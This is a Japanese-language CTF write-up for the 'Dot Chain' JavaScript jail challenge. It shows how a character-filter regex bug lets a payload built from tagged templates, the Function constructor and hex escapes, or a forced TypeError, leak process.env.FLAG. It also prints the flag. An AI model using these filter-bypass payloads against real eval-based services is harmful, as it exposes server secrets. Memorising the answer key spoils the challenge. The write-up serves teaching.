# Dot Chain

[English version is here](./README.md)

## 説明

Can.you.escape

## Writeup

### 概要

この問題は JavaScript jail 問題で、一見すると英字、数字、`.` 以外の文字は使えないように見えます。

```javascript
rl.question("> ")
  .then((input) => {
    if (!/^[.0-9A-z]+$/.test(input)) return;
    eval(input);
  })
  .finally(() => rl.close());
```

目標は `FLAG` 環境変数を取得することで、これは `process.env.FLAG` から参照できます。

### 脆弱性

本当に英字、数字、`.` しか使えないのであればおそらく解法はありません。しかし、この制約を緩めてしまうロジックバグがあります。

正規表現 `[.0-9A-z]` は `.`, 数字、そして **ASCII における `A` から `z` までのすべての文字** にマッチします。つまり、英字だけでなく、`` [\]^_` `` も使えてしまうということです。

### 解法 1: Tagged template を使う

まだ解法はまだ自明ではありません。特に `()` を使って関数呼び出しができないことがボトルネットとなっています。

しかし、[tagged templates](https://developer.mozilla.org/ja/docs/Web/JavaScript/Reference/Template_literals#タグ付きテンプレート) の仕組みを利用し、`` ` `` を使うことで関数を呼び出せます。

例えば、

```javascript
f`Hello world!`
```

は、ほぼ次と同じです。

```javascript
f(["Hello world!"])
```

しかし、[MDN](https://developer.mozilla.org/ja/docs/Web/JavaScript/Reference/Global_Objects/eval#解説) にある通り、`eval` 関数はうまく使えません。

> `eval()` の引数が文字列でない場合、`eval()` は引数を変更せずに返します。

つまり、

```javascript
eval`3*3`
```

は配列 `["3*3"]` を返します。

その代わりに、[`Function` コンストラクタ](https://developer.mozilla.org/ja/docs/Web/JavaScript/Reference/Global_Objects/Function/Function) が使えます。これは引数を文字列に変換してから JavaScript コードとして解釈します。

```javascript
Function`return 3*3`() == 9 // true
```

テンプレート文字列の中では、`\` を使って[文字エスケープ](https://developer.mozilla.org/ja/docs/Web/JavaScript/Reference/Regular_expressions/Character_escape)を利用できます。特に `\u` や `\x` を使うことで、文字を 16 進数の Unicode コードポイントとして記述できます。

最終的なペイロードは次のようになります。

```javascript
Function`console.log\x28process.env.FLAG\x29```
```

### 解法 2: エラーメッセージを使う

この問題では、エラーメッセージもそのままプレイヤーに送られます。つまり、エラー文に`process.env.FLAG` の値をどこかに含められれば、フラグを漏らせます。

これは、`undefined` な値からプロパティを読もうとすることで実現できます。

```javascript
undefined[process.env.FLAG]

/**
* <anonymous_script>:1
* undefined[process.env.FLAG]
*          ^
*
* TypeError: Cannot read properties of undefined (reading 'Alpaca{j4il.is.n0t.just.a.puzzl3}')
*     at eval (eval at <anonymous> (/app/jail.js:11:5), <anonymous>:1:10)
*     at /app/jail.js:11:5
*     at process.processTicksAndRejections (node:internal/process/task_queues:104:5)
* 
* Node.js v25.7.0
*/
```

`undefined` や `null` であれば、どれでも同様のエラーメッセージになります。

```javascript
null[process.env.FLAG]
Object.x[process.env.FLAG]
```

プレイテスト中にこの解法を提供してくれた minaminaoさんに感謝します。

## Flag

`Alpaca{j4il.is.n0t.just.a.puzzl3}`
